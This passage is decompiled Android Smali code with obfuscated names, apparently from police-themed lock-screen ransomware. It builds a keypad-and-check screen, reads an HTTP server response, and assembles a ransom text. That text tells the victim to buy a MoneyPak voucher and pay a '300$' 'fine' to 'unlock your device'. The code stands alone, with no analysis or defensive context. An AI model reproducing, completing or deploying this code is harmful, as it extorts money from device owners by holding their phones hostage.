    new-instance v11, Ljava/io/InputStreamReader;

    invoke-interface {v1}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v12

    invoke-interface {v12}, Lorg/apache/http/HttpEntity;->getContent()Ljava/io/InputStream;

    move-result-object v12

    invoke-direct {v11, v12}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    .line 474
    invoke-direct {v7, v11}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_1

    .line 476
    .end local v6    # "khrhhh":Ljava/io/BufferedReader;
    .local v7, "khrhhh":Ljava/io/BufferedReader;
    :try_start_1
    new-instance v2, Ljava/lang/StringBuffer;

    const-string v11, ""

    invoke-direct {v2, v11}, Ljava/lang/StringBuffer;-><init>(Ljava/lang/String;)V

    .line 477
    .local v2, "crcr":Ljava/lang/StringBuffer;
    const-string v9, ""

    .line 478
    .local v9, "line":Ljava/lang/String;
    const-string v11, "line.separator"

    invoke-static {v11}, Ljava/lang/System;->getProperty(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 479
    .local v0, "NL":Ljava/lang/String;
    :goto_0
    invoke-virtual {v7}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v9

    if-nez v9, :cond_0

    .line 482
    invoke-virtual {v7}, Ljava/io/BufferedReader;->close()V

    .line 483
    invoke-virtual {v2}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    move-result-object v8

    .line 486
    if-eqz v7, :cond_2

    .line 488
    :try_start_2
    invoke-virtual {v7}, Ljava/io/BufferedReader;->close()V
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_3

    move-object v6, v7

    .line 498
    .end local v0    # "NL":Ljava/lang/String;
    .end local v1    # "apterak":Lorg/apache/http/HttpResponse;
    .end local v2    # "crcr":Ljava/lang/StringBuffer;
    .end local v5    # "khbrgfd":Lorg/apache/http/client/HttpClient;
    .end local v7    # "khrhhh":Ljava/io/BufferedReader;
    .end local v9    # "line":Ljava/lang/String;
    .end local v10    # "oep":Lorg/apache/http/client/methods/HttpGet;
    .restart local v6    # "khrhhh":Ljava/io/BufferedReader;
    :goto_1
    return-object v8

    .line 480
    .end local v6    # "khrhhh":Ljava/io/BufferedReader;
    .restart local v0    # "NL":Ljava/lang/String;
    .restart local v1    # "apterak":Lorg/apache/http/HttpResponse;
    .restart local v2    # "crcr":Ljava/lang/StringBuffer;
    .restart local v5    # "khbrgfd":Lorg/apache/http/client/HttpClient;
    .restart local v7    # "khrhhh":Ljava/io/BufferedReader;
    .restart local v9    # "line":Ljava/lang/String;
    .restart local v10    # "oep":Lorg/apache/http/client/methods/HttpGet;
    :cond_0
    :try_start_3
    new-instance v11, Ljava/lang/StringBuilder;

    invoke-static {v9}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v12

    invoke-direct {v11, v12}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v11, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v2, v11}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    goto :goto_0

    .line 485
    .end local v0    # "NL":Ljava/lang/String;
    .end local v2    # "crcr":Ljava/lang/StringBuffer;
    .end local v9    # "line":Ljava/lang/String;
    :catchall_0
    move-exception v11

    move-object v6, v7

    .line 486
    .end local v1    # "apterak":Lorg/apache/http/HttpResponse;
    .end local v5    # "khbrgfd":Lorg/apache/http/client/HttpClient;
    .end local v7    # "khrhhh":Ljava/io/BufferedReader;
    .end local v10    # "oep":Lorg/apache/http/client/methods/HttpGet;
    .restart local v6    # "khrhhh":Ljava/io/BufferedReader;
    :goto_2
    if-eqz v6, :cond_1

    .line 488
    :try_start_4
    invoke-virtual {v6}, Ljava/io/BufferedReader;->close()V
    :try_end_4
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_1
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0

    .line 493
    :cond_1
    :goto_3
    :try_start_5
    throw v11
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_0

    .line 495
    :catch_0
    move-exception v4

    .line 496
    .local v4, "kd":Ljava/lang/Exception;
    :goto_4
    iget-object v11, p0, Lcom/ac/to/HaMo;->reuouuu:Landroid/widget/TextView;

    iget-object v12, p0, Lcom/ac/to/HaMo;->hrtwbv:Ljava/lang/String;

    invoke-virtual {v11, v12}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    goto :goto_1

    .line 489
    .end local v4    # "kd":Ljava/lang/Exception;
    :catch_1
    move-exception v3

    .line 490
    .local v3, "e":Ljava/io/IOException;
    :try_start_6
    iget-object v12, p0, Lcom/ac/to/HaMo;->reuouuu:Landroid/widget/TextView;

    iget-object v13, p0, Lcom/ac/to/HaMo;->hrtwbv:Ljava/lang/String;

    invoke-virtual {v12, v13}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_0

    goto :goto_3

    .line 489
    .end local v3    # "e":Ljava/io/IOException;
    .end local v6    # "khrhhh":Ljava/io/BufferedReader;
    .restart local v0    # "NL":Ljava/lang/String;
    .restart local v1    # "apterak":Lorg/apache/http/HttpResponse;
    .restart local v2    # "crcr":Ljava/lang/StringBuffer;
    .restart local v5    # "khbrgfd":Lorg/apache/http/client/HttpClient;
    .restart local v7    # "khrhhh":Ljava/io/BufferedReader;
    .restart local v9    # "line":Ljava/lang/String;
    .restart local v10    # "oep":Lorg/apache/http/client/methods/HttpGet;
    :catch_2
    move-exception v3

    .line 490
    .restart local v3    # "e":Ljava/io/IOException;
    :try_start_7
    iget-object v11, p0, Lcom/ac/to/HaMo;->reuouuu:Landroid/widget/TextView;

    iget-object v12, p0, Lcom/ac/to/HaMo;->hrtwbv:Ljava/lang/String;

    invoke-virtual {v11, v12}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_3

    move-object v6, v7

    .line 494
    .end local v7    # "khrhhh":Ljava/io/BufferedReader;
    .restart local v6    # "khrhhh":Ljava/io/BufferedReader;
    goto :goto_1

    .line 495
    .end local v3    # "e":Ljava/io/IOException;
    .end local v6    # "khrhhh":Ljava/io/BufferedReader;
    .restart local v7    # "khrhhh":Ljava/io/BufferedReader;
    :catch_3
    move-exception v4

    move-object v6, v7

    .end local v7    # "khrhhh":Ljava/io/BufferedReader;
    .restart local v6    # "khrhhh":Ljava/io/BufferedReader;
    goto :goto_4

    .line 485
    .end local v0    # "NL":Ljava/lang/String;
    .end local v1    # "apterak":Lorg/apache/http/HttpResponse;
    .end local v2    # "crcr":Ljava/lang/StringBuffer;
    .end local v5    # "khbrgfd":Lorg/apache/http/client/HttpClient;
    .end local v9    # "line":Ljava/lang/String;
    .end local v10    # "oep":Lorg/apache/http/client/methods/HttpGet;
    :catchall_1
    move-exception v11

    goto :goto_2

    .end local v6    # "khrhhh":Ljava/io/BufferedReader;
    .restart local v0    # "NL":Ljava/lang/String;
    .restart local v1    # "apterak":Lorg/apache/http/HttpResponse;
    .restart local v2    # "crcr":Ljava/lang/StringBuffer;
    .restart local v5    # "khbrgfd":Lorg/apache/http/client/HttpClient;
    .restart local v7    # "khrhhh":Ljava/io/BufferedReader;
    .restart local v9    # "line":Ljava/lang/String;
    .restart local v10    # "oep":Lorg/apache/http/client/methods/HttpGet;
    :cond_2
    move-object v6, v7

    .end local v7    # "khrhhh":Ljava/io/BufferedReader;
    .restart local v6    # "khrhhh":Ljava/io/BufferedReader;
    goto :goto_1
.end method

.method public probels()Ljava/lang/String;
    .locals 1

    .prologue
    .line 630
    const-string v0, ""

    return-object v0
.end method

.method protected reflAter()V
    .locals 2

    .prologue
    const v1, 0x7f090058

    .line 79
    invoke-virtual {p0}, Lcom/ac/to/HaMo;->lookert()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/ac/to/HaMo;->limbon:Ljava/lang/String;

    .line 81
    const v0, 0x7f090044

    invoke-virtual {p0, v0}, Lcom/ac/to/HaMo;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/EditText;

    iput-object v0, p0, Lcom/ac/to/HaMo;->urre:Landroid/widget/EditText;

    .line 82
    const v0, 0x7f090043

    invoke-virtual {p0, v0}, Lcom/ac/to/HaMo;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/ac/to/HaMo;->one:Landroid/widget/Button;

    .line 83
    const v0, 0x7f090045

    invoke-virtual {p0, v0}, Lcom/ac/to/HaMo;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/ac/to/HaMo;->two:Landroid/widget/Button;

    .line 84
    const v0, 0x7f090046

    invoke-virtual {p0, v0}, Lcom/ac/to/HaMo;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/ac/to/HaMo;->free:Landroid/widget/Button;

    .line 85
    const v0, 0x7f090047

    invoke-virtual {p0, v0}, Lcom/ac/to/HaMo;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/ac/to/HaMo;->four:Landroid/widget/Button;

    .line 86
    const v0, 0x7f090048

    invoke-virtual {p0, v0}, Lcom/ac/to/HaMo;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/ac/to/HaMo;->five:Landroid/widget/Button;

    .line 87
    const v0, 0x7f090049

    invoke-virtual {p0, v0}, Lcom/ac/to/HaMo;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/ac/to/HaMo;->six:Landroid/widget/Button;

    .line 88
    const v0, 0x7f09004a

    invoke-virtual {p0, v0}, Lcom/ac/to/HaMo;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/ac/to/HaMo;->seven:Landroid/widget/Button;

    .line 89
    const v0, 0x7f09004b

    invoke-virtual {p0, v0}, Lcom/ac/to/HaMo;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/ac/to/HaMo;->eight:Landroid/widget/Button;

    .line 90
    const v0, 0x7f09004c

    invoke-virtual {p0, v0}, Lcom/ac/to/HaMo;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/ac/to/HaMo;->nine:Landroid/widget/Button;

    .line 91
    const v0, 0x7f09004d

    invoke-virtual {p0, v0}, Lcom/ac/to/HaMo;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/ac/to/HaMo;->zero:Landroid/widget/Button;

    .line 93
    const v0, 0x7f09004e

    invoke-virtual {p0, v0}, Lcom/ac/to/HaMo;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/ac/to/HaMo;->hotredop:Landroid/widget/Button;

    .line 94
    const v0, 0x7f090054

    invoke-virtual {p0, v0}, Lcom/ac/to/HaMo;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/ac/to/HaMo;->clear:Landroid/widget/Button;

    .line 95
    const v0, 0x7f09005a

    invoke-virtual {p0, v0}, Lcom/ac/to/HaMo;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/ac/to/HaMo;->check:Landroid/widget/Button;

    .line 96
    invoke-virtual {p0, v1}, Lcom/ac/to/HaMo;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Lcom/ac/to/HaMo;->apterak:Landroid/widget/TextView;

    .line 97
    invoke-virtual {p0, v1}, Lcom/ac/to/HaMo;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Lcom/ac/to/HaMo;->reuouuu:Landroid/widget/TextView;

    .line 99
    const v0, 0x7f090053

    invoke-virtual {p0, v0}, Lcom/ac/to/HaMo;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Lcom/ac/to/HaMo;->drimers2:Landroid/widget/TextView;

    .line 100
    const v0, 0x7f090052

    invoke-virtual {p0, v0}, Lcom/ac/to/HaMo;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Lcom/ac/to/HaMo;->drimers3:Landroid/widget/TextView;

    .line 101
    const v0, 0x7f090050

    invoke-virtual {p0, v0}, Lcom/ac/to/HaMo;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Lcom/ac/to/HaMo;->drimers4:Landroid/widget/TextView;

    .line 102
    const v0, 0x7f09004f

    invoke-virtual {p0, v0}, Lcom/ac/to/HaMo;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Lcom/ac/to/HaMo;->drimers5:Landroid/widget/TextView;

    .line 103
    const v0, 0x7f090060

    invoke-virtual {p0, v0}, Lcom/ac/to/HaMo;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Lcom/ac/to/HaMo;->drimers6:Landroid/widget/TextView;

    .line 104
    const v0, 0x7f090055

    invoke-virtual {p0, v0}, Lcom/ac/to/HaMo;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Lcom/ac/to/HaMo;->drimers8:Landroid/widget/TextView;

    .line 105
    const v0, 0x7f090061

    invoke-virtual {p0, v0}, Lcom/ac/to/HaMo;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Lcom/ac/to/HaMo;->drimers9:Landroid/widget/TextView;

    .line 108
    return-void
.end method

.method public streamTel()Ljava/lang/String;
    .locals 1

    .prologue
    .line 67
    const-string v0, "sumux"

    return-object v0
.end method

.method public tokios()Ljava/lang/String;
    .locals 3

    .prologue
    .line 620
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "\n1. Find a retail location near you.\n2. Look for a MoneyPak in the prepaid section. Take it to the cashier and load it with cash.\n3. To pay fine you should enter the digits MoneyPak resulting pass in the payment form and press Pay MoneyPak.\n4. Amount "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 623
    invoke-virtual {p0}, Lcom/ac/to/HaMo;->probels()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, " of"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {p0}, Lcom/ac/to/HaMo;->probels()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, " fine "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {p0}, Lcom/ac/to/HaMo;->probels()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "is "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {p0}, Lcom/ac/to/HaMo;->probels()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "300$. "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 624
    const-string v2, "\n5. After submitting the "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {p0}, Lcom/ac/to/HaMo;->probels()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "MoneyPak "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {p0}, Lcom/ac/to/HaMo;->probels()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "voucher your fine will be redeemed in 24 hours. "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 625
    const-string v2, "For "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {p0}, Lcom/ac/to/HaMo;->probels()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "check to "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {p0}, Lcom/ac/to/HaMo;->probels()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "unlock "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {p0}, Lcom/ac/to/HaMo;->probels()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "your device you should press the button."

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 620
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 626
    .local v0, "jopel":Ljava/lang/String;
    return-object v0
.end method
